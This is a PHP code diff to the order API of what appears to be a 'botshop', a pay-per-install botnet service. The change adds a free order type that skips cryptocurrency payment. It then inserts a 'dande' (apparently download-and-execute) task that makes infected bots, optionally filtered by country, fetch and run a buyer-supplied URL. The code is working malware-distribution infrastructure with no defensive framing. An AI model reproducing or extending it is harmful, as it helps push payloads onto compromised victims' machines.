@@ -81,21 +81,45 @@ class OrderApi
 
     private function generateOrder($type, $bots,$loadurl,$apikey)
     {
-        if($type == "eth"){
-            $ethDriver = new EthereumDriver();
-            $bitcoinAddress = $ethDriver->getNewWallet($this->isTestnet);
-            $usd = $this->botsToUSD($bots);
-            $coinsToPay = $ethDriver->CreateETHPrice($usd);;
+        $usd = 0;
+        $bitcoinAddress = array();
+        if($type == "free"){
+            $coinsToPay = 0;
+            $bitcoinAddress["address"] = "none";
+            $bitcoinAddress["privatekey"] = "none";
         }else{
-            $bitcoinAddress = $this->generateBitcoinAddress($this->isTestnet);
-            $usd = $this->botsToUSD($bots);
-           $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
+            if($type == "eth"){
+                $ethDriver = new EthereumDriver();
+                $bitcoinAddress = $ethDriver->getNewWallet($this->isTestnet);
+                $usd = $this->botsToUSD($bots);
+                $coinsToPay = $ethDriver->CreateETHPrice($usd);;
+            }else{
+                $bitcoinAddress = $this->generateBitcoinAddress($this->isTestnet);
+                $usd = $this->botsToUSD($bots);
+                $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
+            }
         }
 
         $userAuthkey = md5($this->generateRandomString(30));
 
-        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl, userauthkey,from_access_api) VALUES (?, ?, ?, ?, ?, ?, ?, ?,?)");
+        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (`type`, address, privatekey, usd, coinstopay, botamount, loadurl, userauthkey,from_access_api) VALUES (?, ?, ?, ?, ?, ?, ?, ?,?)");
         $statement->execute(array($type, $bitcoinAddress["address"], $bitcoinAddress["privatekey"], $usd, $coinsToPay, $bots,$loadurl,$userAuthkey,$apikey));
+
+        $thisID = $GLOBALS["pdo"]->lastInsertId();
+
+        if($type == "free"){
+            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, task, command, execution_limit) VALUES (?, ?, ?, ?, ?)");
+            //if($order["word_mix"] != "none"){
+           //     $statement->execute(array('{"country":"'.$order["word_mix"].'"}', 0, 'dande', $order["loadurl"], $order["botamount"]));
+          //  }else{
+                $statement->execute(array('{"onlybot":""}', 0, 'dande', $loadurl, $bots));
+           // }
+
+            $taskid = $GLOBALS["pdo"]->lastInsertId();
+            $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_orders SET payed = ?, taskid = ? WHERE id = ?");
+            $statement->execute(array(1, $taskid,$thisID));
+        }
+
         return array(
             "address" => $bitcoinAddress["address"],
             "coinsToPay" => $coinsToPay,
@@ -106,34 +130,57 @@ class OrderApi
 
     private function generateOrderMix($type, $bots,$loadurl,$apikey,$mix)
     {
-        if($type == "eth"){
-            $ethDriver = new EthereumDriver();
-            $bitcoinAddress = $ethDriver->getNewWallet($this->isTestnet);
-            $usd = $this->botsToUSD($bots);
-            $coinsToPay = $ethDriver->CreateETHPrice($usd);;
-        }else{
-            $bitcoinAddress = $this->generateBitcoinAddress($this->isTestnet);
-            $usd = $this->botsToUSD($bots);
-            $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
-        }
-
         $usd = 0;
-        $sql = "SELECT * FROM botshop_pricelist";
-        $mixArray = explode(",",$mix);
-        $botsDifference = number_format($bots / count($mixArray),0);
-        foreach ($GLOBALS["pdo"]->query($sql)->fetchAll(PDO::FETCH_ASSOC) as $listItem) {
-            foreach ($mixArray as $selected){
-                if($listItem["iso_short"] == $selected){
-                    $usd +=  $botsDifference * $listItem["price_usd"];
+        if($type == "free"){
+            $coinsToPay = 0;
+            $bitcoinAddress["address"] = "none";
+            $bitcoinAddress["privatekey"] = "none";
+        }else{
+            if($type == "eth"){
+                $ethDriver = new EthereumDriver();
+                $bitcoinAddress = $ethDriver->getNewWallet($this->isTestnet);
+                $usd = $this->botsToUSD($bots);
+                $coinsToPay = $ethDriver->CreateETHPrice($usd);;
+            }else{
+                $bitcoinAddress = $this->generateBitcoinAddress($this->isTestnet);
+                $usd = $this->botsToUSD($bots);
+                $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
+            }
+
+
+            $sql = "SELECT * FROM botshop_pricelist";
+            $mixArray = explode(",",$mix);
+            $botsDifference = number_format($bots / count($mixArray),0);
+            foreach ($GLOBALS["pdo"]->query($sql)->fetchAll(PDO::FETCH_ASSOC) as $listItem) {
+                foreach ($mixArray as $selected){
+                    if($listItem["iso_short"] == $selected){
+                        $usd +=  $botsDifference * $listItem["price_usd"];
+                    }
                 }
             }
         }
+
+
 
         //$usd = $this->botsToUSD($bots);
         $userAuthkey = md5($this->generateRandomString(30));
         //$coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
         $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl, userauthkey,from_access_api,word_mix) VALUES (?, ?, ?, ?, ?, ?, ?, ?,?,?)");
         $statement->execute(array($type, $bitcoinAddress["address"], $bitcoinAddress["privatekey"], $usd, $coinsToPay, $bots,$loadurl,$userAuthkey,$apikey,$mix));
+        $thisID = $GLOBALS["pdo"]->lastInsertId();
+        if($type == "free"){
+            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, task, command, execution_limit) VALUES (?, ?, ?, ?, ?)");
+
+            $statement->execute(array('{"country":"'.$mix.'"}', 0, 'dande', $loadurl, $bots));
+
+
+
+            $taskid = $GLOBALS["pdo"]->lastInsertId();
+            $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_orders SET payed = ?, taskid = ? WHERE id = ?");
+            $statement->execute(array(1, $taskid,$thisID));
+        }
+
+
         return array(
             "address" => $bitcoinAddress["address"],
             "coinsToPay" => $coinsToPay,
